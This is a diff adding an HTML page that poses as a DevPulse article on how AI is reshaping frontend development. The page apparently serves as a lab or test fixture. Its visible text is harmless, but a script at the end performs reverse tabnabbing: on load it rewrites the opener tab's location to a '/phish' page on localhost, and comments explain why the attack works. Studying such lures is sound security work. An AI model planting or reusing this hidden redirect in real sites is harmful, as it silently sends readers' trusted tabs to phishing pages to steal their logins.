@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>How AI Is Reshaping Frontend Development — DevPulse</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: Georgia, 'Times New Roman', serif;
+      background: #fafafa;
+      color: #1a1a1a;
+      line-height: 1.75;
+    }
+    .site-header {
+      background: #fff;
+      border-bottom: 1px solid #e5e5e5;
+      padding: 1rem 2rem;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      font-weight: 700;
+      font-size: 1.1rem;
+      color: #333;
+    }
+    .hero {
+      height: 220px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      display: flex;
+      align-items: flex-end;
+      padding: 2rem;
+    }
+    .hero span {
+      color: rgba(255,255,255,0.85);
+      font-family: -apple-system, sans-serif;
+      font-size: 0.85rem;
+    }
+    article {
+      max-width: 680px;
+      margin: 0 auto;
+      padding: 2.5rem 1.5rem 4rem;
+    }
+    h1 {
+      font-size: 2rem;
+      line-height: 1.25;
+      margin-bottom: 1rem;
+    }
+    .byline {
+      font-family: -apple-system, sans-serif;
+      font-size: 0.9rem;
+      color: #666;
+      margin-bottom: 2rem;
+      padding-bottom: 1.5rem;
+      border-bottom: 1px solid #e5e5e5;
+    }
+    p { margin-bottom: 1.25rem; font-size: 1.1rem; }
+    .reading-meta {
+      position: fixed;
+      bottom: 1.5rem;
+      right: 1.5rem;
+      background: #fff;
+      border: 1px solid #e5e5e5;
+      border-radius: 8px;
+      padding: 0.5rem 1rem;
+      font-family: -apple-system, sans-serif;
+      font-size: 0.8rem;
+      color: #888;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+    }
+    .scroll-hint {
+      text-align: center;
+      color: #aaa;
+      font-family: -apple-system, sans-serif;
+      font-size: 0.85rem;
+      margin-top: 2rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="site-header">DevPulse · Independent Tech Journalism</div>
+  <div class="hero"><span>AI &amp; Tools · Featured</span></div>
+
+  <article>
+    <h1>How AI Is Reshaping Frontend Development</h1>
+    <div class="byline">By Jordan Ellis · March 12, 2026 · Reading time: ~8 min</div>
+
+    <p>The frontend landscape is changing faster than at any point since React's introduction in 2013. AI-assisted coding tools are no longer experimental — they are part of the daily workflow for millions of developers.</p>
+
+    <p>Copilot-style autocomplete has evolved into full agentic workflows: describe a feature in plain English, receive a pull request. Design-to-code tools convert Figma frames into component libraries with surprising accuracy. The bottleneck is shifting from typing speed to review discipline.</p>
+
+    <p>Teams adopting these tools report mixed results. Junior developers ship faster but sometimes miss architectural implications. Senior engineers use AI for boilerplate while reserving judgment calls for themselves. The consensus emerging in 2026: AI amplifies existing skill levels rather than replacing them.</p>
+
+    <p>What hasn't changed is the need for strong fundamentals. Understanding the DOM, accessibility, and performance still separates maintainable code from generated slop. The best frontend engineers treat AI as a powerful intern — fast, eager, and in need of supervision.</p>
+
+    <p class="scroll-hint">↓ Continue reading</p>
+  </article>
+
+  <div class="reading-meta">📖 ~8 min left</div>
+
+  <script>
+    // Reverse tabnabbing: redirect the tab that opened this page
+    // ⚠️ IMPORTANT: window.opener.location can only be WRITTEN cross-origin, never READ.
+    // Reading window.opener.location (e.g. JSON.stringify) throws SecurityError — Same-Origin Policy.
+    // Writing window.opener.location IS allowed — that is the vulnerability.
+    if (window.opener && !window.opener.closed) {
+      window.opener.location = 'http://localhost:3017/phish';
+    }
+  </script>
+</body>
+</html>
